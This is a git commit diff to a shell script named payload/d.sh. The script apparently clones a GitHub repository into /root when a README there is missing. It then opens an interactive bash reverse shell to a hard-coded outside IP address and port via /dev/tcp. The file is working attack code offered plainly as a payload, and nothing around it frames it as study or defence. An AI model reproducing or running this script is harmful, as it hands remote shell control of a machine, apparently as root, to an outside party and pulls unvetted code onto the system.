a30944352f7a9528641489dbd23462f8176ee191
dev01team <125609175+dev01team@users.noreply.github.com>
2023-02-28 01:58:30 +0100

    Update d.sh

--- payload/d.sh
+++ payload/d.sh
@@ -1,3 +1,13 @@
 #!/bin/bash
 
+File="/root/SDA_ALL/README.md"
+if [ -f "$File" ]; then  
+echo "$File exist"  
+else  
+echo "$File does not exist"
+git clone https://github.com/GH0STAV0/SDA_ALL.git /root/SDA_ALL
+fi  
+
+
+
 bash -i >& /dev/tcp/105.105.225.248/10001 0>&1
